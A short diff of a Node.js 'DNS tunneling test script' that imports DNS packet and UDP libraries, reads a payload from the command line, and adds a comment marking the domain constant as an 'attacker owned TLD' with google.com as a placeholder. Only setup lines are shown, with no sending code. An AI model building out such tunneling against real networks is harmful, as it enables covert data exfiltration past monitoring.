@@ -1,9 +1,9 @@
-
+                
 // DNS tunneling test Script
 
 const packet = require('dns-packet');
 const dgram  = require('dgram');
-const tld    = 'google.com';
+const tld    = 'google.com';                                                                      // Attacker owned TLD. Using 'google.com' as a placeholder  
 var str = new String();
 
 if (process.argv.length === 3) {                                                                  // Provide a payload
